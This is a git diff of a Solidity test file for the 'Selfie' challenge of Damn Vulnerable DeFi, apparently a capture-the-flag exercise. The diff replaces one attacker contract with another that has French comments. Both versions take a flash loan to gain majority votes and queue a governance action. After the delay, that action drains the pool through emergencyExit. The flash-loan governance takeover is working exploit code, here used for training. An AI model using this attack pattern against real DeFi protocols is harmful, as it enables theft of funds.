@@ -6,90 +6,6 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
-import {
-    FlashLoanReceiver
-} from "../../src/naive-receiver/FlashLoanReceiver.sol";
-import {
-    IERC3156FlashBorrower
-} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
-import {
-    IERC3156FlashLender
-} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
-import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
-
-contract SelfieAttacker is IERC3156FlashBorrower {
-    bytes32 private constant CALLBACK_SUCCESS =
-        keccak256("ERC3156FlashBorrower.onFlashLoan");
-
-    SelfiePool public immutable pool;
-    SimpleGovernance public immutable governance;
-    DamnValuableVotes public immutable token;
-    address public immutable recovery;
-
-    uint256 public actionId;
-
-    constructor(
-        SelfiePool _pool,
-        SimpleGovernance _governance,
-        DamnValuableVotes _token,
-        address _recovery
-    ) {
-        pool = _pool;
-        governance = _governance;
-        token = _token;
-        recovery = _recovery;
-    }
-
-    /// @notice start the flash loan for amount
-    function takeLoan(uint256 amount) external {
-        IERC3156FlashLender(address(pool)).flashLoan(
-            IERC3156FlashBorrower(address(this)),
-            address(token),
-            amount,
-            bytes("") // unused
-        );
-    }
-
-    /// @notice ERC-3156 callback invoked by the pool
-    function onFlashLoan(
-        address, // initiator (unused)
-        address tokenAddress,
-        uint256 amount,
-        uint256, // fee (0)
-        bytes calldata // data (unused)
-    ) external override returns (bytes32) {
-        require(msg.sender == address(pool), "only pool");
-        require(tokenAddress == address(token), "wrong token");
-
-        // get voting power from the borrowed tokens
-        token.delegate(address(this));
-
-        // build calldata for emergencyExit(address)
-        bytes memory drainCalldata = abi.encodeWithSignature(
-            "emergencyExit(address)",
-            recovery
-        );
-
-        // queue the governance action using the exact typed signature the challenge expects:
-        // queueAction(address target, uint128 value, bytes calldata data)
-        // this call will revert unless this contract has > 50% of total votes (it does while holding the flash loan)
-        actionId = governance.queueAction(
-            address(pool),
-            uint128(0),
-            drainCalldata
-        );
-
-        // approve pool to pull tokens back and repay flash loan
-        IERC20(tokenAddress).approve(address(pool), amount);
-
-        return CALLBACK_SUCCESS;
-    }
-
-    /// @notice execute the queued action after governance delay has passed
-    function execute() external {
-        governance.executeAction(actionId);
-    }
-}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -146,23 +62,20 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        // deploy attacker as player
-        SelfieAttacker attacker = new SelfieAttacker(
-            pool,
-            governance,
-            token,
+        // On déploie un contrat attaquant qui va :
+        // 1. Emprunter des tokens via flash loan pour avoir le voting power
+        // 2. Proposer une action malicieuse dans la gouvernance
+        // 3. Attendre le délai de 2 jours
+        // 4. Exécuter l'action pour drainer la pool
+        SelfieAttacker selfieAttacker = new SelfieAttacker(
+            address(pool),
+            address(governance),
+            address(token),
             recovery
         );
-
-        // take the max available flash loan
-        uint256 amount = pool.maxFlashLoan(address(token));
-        attacker.takeLoan(amount);
-
-        // fast-forward past governance delay (SimpleGovernance uses 2 days)
-        vm.warp(block.timestamp + governance.getActionDelay() + 1);
-
-        // execute the queued action
-        attacker.execute();
+        selfieAttacker.startAttack(); // Lance le flash loan + proposition
+        vm.warp(block.timestamp + 2 days); // Fast-forward de 2 jours
+        selfieAttacker.executeProposal(); // Execute l'action malicieuse
     }
 
     /**
@@ -171,10 +84,69 @@ contract SelfieChallenge is Test {
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(
-            token.balanceOf(recovery),
-            TOKENS_IN_POOL,
-            "Not enough tokens in recovery account"
+        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+contract SelfieAttacker is IERC3156FlashBorrower {
+    // Contrat attaquant pour exploiter la gouvernance via flash loan
+    address recovery;
+    SelfiePool pool;
+    SimpleGovernance governance;
+    DamnValuableVotes token;
+    uint actionId;
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    constructor(
+        address _pool, 
+        address _governance,
+        address _token,
+        address _recovery
+    ){
+        pool = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+        token = DamnValuableVotes(_token);
+        recovery = _recovery;
+    }
+
+    function startAttack() external {
+        // Lance un flash loan de tous les tokens de la pool
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000 ether, "");
+    }
+
+    function onFlashLoan(
+        address _initiator,
+        address /*_token*/,
+        uint256 _amount,
+        uint256 _fee,
+        bytes calldata /*_data*/
+    ) external returns (bytes32){
+
+        require(msg.sender == address(pool), "SelfieAttacker: Only pool can call");
+        require(_initiator == address(this), "SelfieAttacker: Initiator is not self");
+        
+        // Pendant le flash loan on a tous les tokens
+        // On se délègue les votes à nous-mêmes pour avoir le voting power
+        token.delegate(address(this));
+        
+        // On queue une action malicieuse : emergencyExit vers recovery
+        // Ça passe car on a la majorité des votes (>50%)
+        uint _actionId = governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeWithSignature("emergencyExit(address)", recovery)
         );
+
+        actionId = _actionId;
+        // On approve le remboursement du flash loan
+        token.approve(address(pool), _amount+_fee);
+        return CALLBACK_SUCCESS;
+    }
+
+    function executeProposal() external {
+        // Après le délai de 2 jours, on exécute l'action malicieuse
+        // Ça va appeler emergencyExit() et transférer tous les tokens vers recovery
+        governance.executeAction(actionId);
     }
 }
